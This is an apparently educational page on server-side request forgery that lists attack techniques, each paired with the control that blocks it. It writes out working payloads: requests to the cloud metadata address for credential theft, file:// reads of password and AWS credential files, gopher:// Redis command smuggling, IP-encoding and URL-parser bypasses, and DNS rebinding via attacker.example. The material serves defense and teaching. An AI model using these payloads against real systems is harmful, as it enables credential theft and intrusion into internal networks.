# C10: Stop Server-Side Request Forgery - Threats Addressed

## Table of Contents
- [What This Control Defends Against](#understanding)
- [Core Attack Flow](#core-attack-flow)
- [Threats Addressed](#threats)
- [Bypasses This Control Must Survive](#bypasses)
- [Chaining SSRF](#chaining)

## What This Control Defends Against

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix SSRF in systems you own or are authorised to test. They describe what happens *when the control is missing*.

Server-Side Request Forgery is exploited by supplying a URL (or something that becomes one) that the server then fetches from its own privileged position on the network. The attacker never touches the internal target directly—your server does it for them, from inside the perimeter, with whatever trust and credentials the server holds.

The threats below are what a missing "Stop SSRF" control exposes. Each is followed by the mechanism an attacker uses; the [How to Implement](prevention.md) guide maps each back to a specific defense.

### Core Attack Flow

```
1. Find the sink
   |
   A feature that fetches a URL: webhook, importer, link preview, PDF/image fetcher, proxy
2. Supply a target
   |
   Replace the intended URL with an internal / metadata / file target
3. Bypass weak checks
   |
   Alternate IP encodings, DNS rebinding, redirects, extra schemes
4. Exploit
   |
   Read metadata credentials, hit internal services, scan ports, read files
5. Escalate
   |
   Use stolen cloud creds or internal access to pivot deeper
```

## Threats Addressed

### 1. Cloud Metadata Credential Theft

The highest-impact SSRF outcome: the server is steered to the cloud instance metadata service on the link-local address, and returns temporary credentials for the instance's role.

```http
POST /api/webhooks HTTP/1.1
Content-Type: application/json

{"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Server fetches the URL and returns / logs:
{
  "Code": "Success",
  "AccessKeyId": "AKIA...REDACTED",
  "SecretAccessKey": "REDACTED",
  "Token": "REDACTED..."
}
```

**Payoff**: valid cloud credentials for the account. **Addressed by**: network egress filtering that blocks `169.254.169.254`, resolved-IP validation rejecting link-local ranges, and enforcing IMDSv2 (session-token) with a hop limit.

### 2. Access to Internal-Only Services

Services never exposed to the internet—admin panels, databases, caches, dashboards—are reachable from the app host and answer a request that appears to come from a trusted source.

```http
GET /fetch?url=http://10.0.0.15:8080/admin/config HTTP/1.1
GET /fetch?url=http://localhost:9200/_cat/indices HTTP/1.1
GET /fetch?url=http://internal-jenkins:8080/scriptText HTTP/1.1
```

**Payoff**: reach and read internal control planes. **Addressed by**: an allow-list of external destinations only, resolved-IP checks rejecting private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), and network segmentation.

### 3. Internal Port Scanning and Host Discovery

Even a "blind" SSRF (no response body returned) leaks internal topology through timing and error differences.

```
# Open port -> fast connect, different error than a closed port
GET /fetch?url=http://10.0.0.20:6379   -> 500 "connection reset" (service present)
GET /fetch?url=http://10.0.0.20:6380   -> timeout            (nothing listening)

# Sweep a range to map live hosts and open ports
for ip in 10.0.0.1 .. 10.0.0.254: fetch(http://ip:PORT)
```

**Payoff**: a map of internal hosts and open ports for the next stage. **Addressed by**: egress filtering to private ranges, resolved-IP validation, and uniform generic errors/timeouts that do not leak connect status.

### 4. Local File Read via file://

If the HTTP client honors the `file` scheme, the "URL" fetch reads local files instead.

```
GET /fetch?url=file:///etc/passwd HTTP/1.1
GET /fetch?url=file:///proc/self/environ HTTP/1.1     # process env, may hold secrets
GET /fetch?url=file:///root/.aws/credentials HTTP/1.1
```

**Payoff**: disclosure of local files, environment variables, and on-disk secrets. **Addressed by**: allow-listing only `http`/`https` schemes and disabling `file://`.

### 5. Protocol Smuggling via gopher:// and dict://

Non-HTTP schemes let an attacker craft raw, multi-line bytes to line-based internal services (Redis, SMTP, memcached), turning SSRF into internal command execution.

```
# gopher can encode CRLF-separated commands to a raw TCP service:
gopher://127.0.0.1:6379/_SET%20key%20value%0D%0A...   # writes to an internal Redis
dict://127.0.0.1:11211/stats                          # talks to memcached
```

**Payoff**: send arbitrary commands to internal services, not just GET them. **Addressed by**: disabling all schemes except `http`/`https`.

### 6. Allow-list Bypass via Alternate IP Encodings

A naive block-list of `127.0.0.1`/`localhost` is defeated by the many ways to write the same address.

```
http://127.0.0.1        http://localhost
http://127.1            http://0.0.0.0
http://2130706433       # decimal form of 127.0.0.1
http://0x7f000001       # hex form
http://0177.0.0.1       # octal form
http://[::1]            http://[::ffff:127.0.0.1]   # IPv6 loopback / mapped
http://[0:0:0:0:0:ffff:169.254.169.254]             # IPv6-mapped metadata IP
```

**Payoff**: reaches loopback/metadata despite string filtering. **Addressed by**: parse the URL, resolve to an IP, and validate the *normalized IP* against reserved ranges—never match on the raw string.

### 7. Allow-list Bypass via DNS Rebinding

The attacker controls a domain that passes validation, then changes its DNS answer to an internal IP before the HTTP client connects (a time-of-check to time-of-use gap).

```
# attacker.example resolves to a public IP at validation time,
# then to 169.254.169.254 (or 127.0.0.1) a moment later at connect time.
GET /fetch?url=http://attacker.example/ HTTP/1.1
#   validate()  -> resolves to 203.0.113.10  (passes)
#   connect()   -> re-resolves to 169.254.169.254  (attacker flipped the record)
```

**Payoff**: bypasses a hostname allow-list entirely. **Addressed by**: re-resolve at connection time and *pin* the connection to the exact IP that was validated, so the record cannot change underneath the check.

### 8. Allow-list Bypass via Redirects

A validated, benign URL responds with a redirect to an internal or metadata target, and a client that follows redirects honors it without re-checking.

```http
GET /fetch?url=https://benign.example/start HTTP/1.1

HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/   # redirect target never re-validated
```

**Payoff**: turns any open-redirect or attacker-controlled endpoint into full SSRF. **Addressed by**: do not follow redirects on user-supplied fetches, or re-validate every hop's resolved IP as strictly as the first.

### 9. Credential and URL-Confusion Tricks

URL parsing quirks are used to make a target look like an allowed host.

```
http://allowed.example@169.254.169.254/     # userinfo before @ fools naive parsers
http://169.254.169.254#.allowed.example/    # fragment / suffix confusion
http://169.254.169.254%2f.allowed.example/  # encoded slash
```

**Payoff**: a permissive parser reads `allowed.example` while the client connects to the metadata IP. **Addressed by**: use a single robust URL parser, extract the real host, resolve it, and validate the resolved IP—never trust substring matches.

## Bypasses This Control Must Survive

A correct implementation is defined by the bypasses it withstands. Any SSRF defense that only inspects the URL string will fall to at least one of these:

| Bypass | How it evades a weak check | What actually stops it |
|--------|----------------------------|------------------------|
| Alternate IP encodings | Decimal/hex/octal/IPv6 forms of the same address | Normalize to an IP, validate ranges |
| DNS rebinding | Record changes between check and connect | Re-resolve and pin the validated IP |
| Redirects | 302 to an internal target after a clean first URL | Don't follow, or re-validate every hop |
| Extra schemes | `file://`, `gopher://`, `dict://` | Allow only `http`/`https` |
| Userinfo / fragment tricks | `@`, `#`, encoded slashes fool parsers | Robust parser + resolved-IP check |
| IPv6 & mapped addresses | `[::1]`, `[::ffff:127.0.0.1]` | Validate IPv6 reserved ranges too |

## Chaining SSRF

SSRF is rarely the end goal—it is the pivot that reaches something valuable:

```
Link-preview fetch (no egress filtering)
        -> request http://169.254.169.254/.../iam/security-credentials/
        -> steal instance role credentials
        -> call the cloud API with those credentials
        =  cloud account access, no application exploit beyond the fetch
```

Another common chain:

```
Webhook URL validated by hostname only
        -> attacker domain passes, then rebinds to 127.0.0.1
        -> reach an internal admin API bound to loopback
        -> trigger an internal-only action
        =  authenticated internal action driven from the public app
```

## Key Takeaways

1. **SSRF turns your server into the attacker's proxy**—the request comes from inside, with your trust.
2. **Metadata theft is the marquee threat**—block `169.254.169.254` at the network and enforce IMDSv2.
3. **String checks lose**—alternate encodings, rebinding, redirects, and parser tricks defeat them.
4. **Validate the resolved IP and pin it**—this is what survives the real bypasses.
5. **Even blind SSRF is dangerous**—port scanning and internal reconnaissance need no response body.

## Next Steps

- **[How to Implement](prevention.md)**: Turn each threat into a concrete defense
- **[Examples](examples.md)**: See vulnerable vs. secure URL handling side by side
- **[Proactive Controls](/learn/proactive)**: Continue the OWASP Proactive Controls track
- **[Practice](/practice)**: Find and fix SSRF hands-on
